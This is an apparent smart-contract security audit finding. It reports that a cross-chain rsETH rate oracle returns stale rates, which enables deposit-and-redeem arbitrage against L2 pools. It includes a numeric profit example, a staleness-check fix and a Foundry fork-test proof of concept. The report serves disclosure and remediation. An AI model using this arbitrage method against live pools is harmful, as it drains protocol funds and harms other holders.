### Title
Stale Cross-Chain Rate Accepted Without Freshness Check Enables Arbitrage-Driven Protocol Insolvency - (`contracts/cross-chain/CrossChainRateReceiver.sol`)

---

### Summary

`CrossChainRateReceiver` stores `lastUpdated` but `getRate()` returns `rate` unconditionally. Every L2 pool contract (`RSETHPool`, `RSETHPoolV2`, `RSETHPoolV3`, and their variants) calls `IOracle(rsETHOracle).getRate()` with no staleness guard. If the LayerZero update pipeline stalls for any reason, the stored rate silently ages while the true rsETH/ETH exchange rate rises with staking rewards. An attacker can deposit ETH at the stale (lower) rate, receive excess wrsETH, bridge it to L1, and redeem at the true (higher) rate, extracting value that the protocol cannot cover.

### Impact Explanation

rsETH accrues staking rewards continuously, so its ETH price (`rate`) rises monotonically over time. If the rate is stale at a lower value:

```
rsETHAmount = amountAfterFee * 1e18 / rsETHToETHrate
```

A lower stale `rsETHToETHrate` produces a **larger** `rsETHAmount` than the deposited ETH warrants at the true rate.

**Concrete example (ignoring fees for clarity):**

| | Stale rate (1.05) | True rate (1.20) |
|---|---|---|
| ETH deposited | 1 ETH | 1 ETH |
| wrsETH minted | 0.9524 wrsETH | 0.8333 wrsETH |
| L1 redemption value | 0.9524 × 1.20 = **1.143 ETH** | 0.8333 × 1.20 = 1.00 ETH |
| **Attacker profit** | **+0.143 ETH** | 0 |

The L2 pool collected 1 ETH but the L1 must back 0.9524 wrsETH at 1.20 ETH/rsETH = 1.143 ETH. The 0.143 ETH shortfall is a direct protocol loss. Repeated over many depositors or days, this compounds into insolvency.

`RSETHPoolV2` and `RSETHPoolV3` **mint** new wrsETH on deposit, making the supply inflation unbounded (subject only to the daily mint cap, which resets every 24 hours and does not prevent multi-day exploitation). `RSETHPool` transfers pre-held wrsETH, so the pool drains faster than the ETH it collects can cover. ---

### Likelihood Explanation

LayerZero message delivery can be delayed or stall due to network congestion, relayer downtime, or gas exhaustion on the destination chain — all without any on-chain signal. The rate update is push-only (triggered by the provider on L1); if the provider's keeper fails or is griefed, the L2 rate ages silently. A 30-day staleness window is realistic given no heartbeat enforcement. The attacker needs only a standard ETH deposit — a fully permissionless, production-supported entry point.

---

### Recommendation

Add a configurable `maxRateAge` to `CrossChainRateReceiver` and revert in `getRate()` if `block.timestamp - lastUpdated > maxRateAge`:

```solidity
uint256 public maxRateAge; // e.g. 24 hours

function getRate() external view returns (uint256) {
    require(block.timestamp - lastUpdated <= maxRateAge, "Rate is stale");
    return rate;
}
```

This single change propagates protection to every pool that calls `getRate()` through the `IOracle` interface, without modifying any pool contract.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork test — run against an L2 (e.g. Arbitrum) fork
// with CrossChainRateReceiver deployed as rsETHOracle

import "forge-std/Test.sol";

interface ICrossChainRateReceiver {
    function rate() external view returns (uint256);
    function lastUpdated() external view returns (uint256);
    function getRate() external view returns (uint256);
}

interface IPool {
    function deposit(string memory referralId) external payable;
    function viewSwapRsETHAmountAndFee(uint256 amount)
        external view returns (uint256 rsETHAmount, uint256 fee);
}

interface IWrsETH {
    function balanceOf(address) external view returns (uint256);
}

contract StaleRatePoC is Test {
    // Replace with actual deployed addresses on the fork
    address constant POOL    = address(0xPOOL);
    address constant ORACLE  = address(0xORACLE);
    address constant WRSETH  = address(0xWRSETH);

    address attacker = makeAddr("attacker");

    function testStaleRateArbitrage() external {
        // 1. Confirm rate is stale (last updated > 7 days ago)
        uint256 lastUpdated = ICrossChainRateReceiver(ORACLE).lastUpdated();
        assertGt(block.timestamp - lastUpdated, 7 days, "rate not stale");

        uint256 staleRate = ICrossChainRateReceiver(ORACLE).getRate();
        // staleRate < trueRate because staking rewards have accrued

        // 2. Compute expected rsETH at stale rate
        uint256 depositAmount = 10 ether;
        (uint256 expectedRsETH,) = IPool(POOL).viewSwapRsETHAmountAndFee(depositAmount);

        // 3. Attacker deposits
        vm.deal(attacker, depositAmount);
        vm.prank(attacker);
        IPool(POOL).deposit{value: depositAmount}("poc");

        uint256 received = IWrsETH(WRSETH).balanceOf(attacker);
        assertEq(received, expectedRsETH);

        // 4. Compute profit: received * trueRate - depositAmount
        // trueRate obtained off-chain or from L1 oracle; here we use a known value
        uint256 trueRate = 1.20e18; // ETH per rsETH
        uint256 l1RedemptionValue = received * trueRate / 1e18;

        // Assert attacker profit > 0
        assertGt(l1RedemptionValue, depositAmount,
            "no profit: stale rate did not cause over-issuance");

        emit log_named_uint("Stale rate (ETH/rsETH, 1e18)", staleRate);
        emit log_named_uint("True rate  (ETH/rsETH, 1e18)", trueRate);
        emit log_named_uint("wrsETH received", received);
        emit log_named_uint("L1 redemption value (ETH, 1e18)", l1RedemptionValue);
        emit log_named_uint("Attacker profit (ETH, 1e18)", l1RedemptionValue - depositAmount);
    }
}
```

Run with:
```
forge test --match-test testStaleRateArbitrage --fork-url $ARB_RPC_URL -vvvv
```

The test asserts `l1RedemptionValue > depositAmount`, proving the invariant that wrsETH must be fully backed at the current exchange rate is violated whenever the stored rate is materially below the true rate.
